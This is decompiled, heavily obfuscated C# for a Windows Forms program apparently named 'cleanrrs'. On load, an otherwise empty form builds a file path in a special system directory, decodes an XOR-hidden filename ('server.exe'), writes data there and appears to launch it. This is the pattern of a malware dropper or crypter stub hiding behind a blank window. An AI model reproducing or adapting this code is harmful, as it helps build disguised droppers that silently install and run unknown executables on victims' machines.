using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Security;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using cleanrrs.My;
using ns0;

namespace cleanrrs;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> list_0;

	private Class12.Struct7 struct7_0;

	internal int int_0;

	[SecuritySafeCritical]
	static Form1()
	{
		Class3.Class5.Class6.smethod_0();
		list_0 = new List<WeakReference>();
	}

	public Form1()
	{
		Class3.Class5.smethod_6<Form, EventHandler>((Form)(object)this, (EventHandler)method_1, 559, 513);
		smethod_0(this);
		method_0();
	}

	private static void smethod_0(object object_0)
	{
		List<WeakReference> gparam_ = list_0;
		bool bool_ = false;
		checked
		{
			try
			{
				Class7.smethod_3((object)gparam_, ref bool_, '\u0099', 'í');
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference gparam_2 = list_0[num3];
						if (Class3.smethod_12(gparam_2, 900, 979))
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(Class3.smethod_5(object_0, 54, 'a')));
			}
			finally
			{
				if (bool_)
				{
					Class10.Class11.smethod_0((object)gparam_, 'Κ', 1002);
				}
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && struct7_0.icontainer_0 != null) ? true : false)
			{
				struct7_0.icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void method_0()
	{
		Class3.smethod_13<Control>((Control)(object)this, 'ˊ', '\u02d5');
		SizeF sizeF_ = new SizeF(6f, 13f);
		Class7.Class8.smethod_4<ContainerControl>((ContainerControl)(object)this, sizeF_, (short)61, (short)67);
		Class7.Class8.smethod_5<ContainerControl>((ContainerControl)(object)this, (AutoScaleMode)1, 'ͺ', '\u0300');
		Size size_ = new Size(284, 262);
		Class3.Class5.Class6.smethod_2<Form>((Form)(object)this, size_, 68, 111);
		Class3.smethod_14<Control, string>((Control)(object)this, "Form1", 'ũ', 'Ĕ');
		Class10.smethod_6<Form, string>((Form)(object)this, "Form1", 259, 339);
		Class12.Class13.smethod_11<Control>((Control)(object)this, bool_0: false, 'Ά', (short)990);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_1(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string gparam_ = default(string);
		string gparam_2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					Class7.Class8.smethod_6('ʷ', 748);
					num3 = -2;
					goto IL_0013;
				case 187:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0001;
							case 1:
								break;
							case 0:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0013;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_0049;
						case 5:
							goto IL_007b;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 0:
							goto end_IL_0001;
						case 7:
							goto IL_012e;
						}
						goto default;
					}
					IL_007b:
					num = 5;
					Class7.Class8.smethod_7(gparam_, Class7.smethod_0(), 405, 455);
					break;
					IL_0049:
					num = 4;
					gparam_ = Class3.smethod_16(Class7.smethod_8((object)gparam_2, method_2("\u0006\u0010\a\u0003\u0010\a[\u0010\r\u0010", "upfwZCsIvTZQuVXgMOXEAcL"), 'ų', 378), 870, 835);
					goto IL_007b;
					IL_0013:
					num = 2;
					int_0 = 1000;
					goto IL_0020;
					IL_0020:
					num = 3;
					gparam_2 = Class3.smethod_15<SpecialDirectoriesProxy>(Class7.smethod_7<FileSystemProxy>(Class3.Class5.Class6.smethod_3<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 'Ȳ', 619), (short)54, 101), 40, 75);
					goto IL_0049;
					end_IL_0001_2:
					break;
				}
				num = 6;
				Class7.Class8.smethod_8(gparam_, 788, '\u0309');
				Class7.Class8.smethod_6('ʓ', 719);
				goto IL_012e;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				Class10.Class11.smethod_10((Exception)obj, 682, 'ʎ');
				try0001_dispatch = 187;
				continue;
			}
			break;
			IL_012e:
			if (num2 != 0)
			{
				Class10.Class11.smethod_1('ȋ', 564);
			}
			return;
		}
		throw Class12.Class13.smethod_13(-2146828237, 270, 367);
	}

	private object method_2(string string_0, string string_1)
	{
		string text = (string)(IEquatable<string>)"";
		int num = Class3.Class5.smethod_7(string_1, 251, 173);
		checked
		{
			short num2 = (short)Class3.Class5.smethod_7(string_0, 94, 9);
			short num3 = 1;
			while (true)
			{
				short num4 = num3;
				short num5 = num2;
				if (num4 > num5)
				{
					break;
				}
				text = (string)(IEquatable<string>)Class10.smethod_3(text, Class7.smethod_9(Class3.Class5.Class6.smethod_4(num ^ Class3.Class5.smethod_7(Class7.Class8.smethod_9(string_0, num3, 1, 101, 85), 139, 221), 296, 'ń'), 208, 'ã'), 'ε', 'Ͼ');
				num3 = (short)unchecked(num3 + 1);
			}
			return text;
		}
	}
}
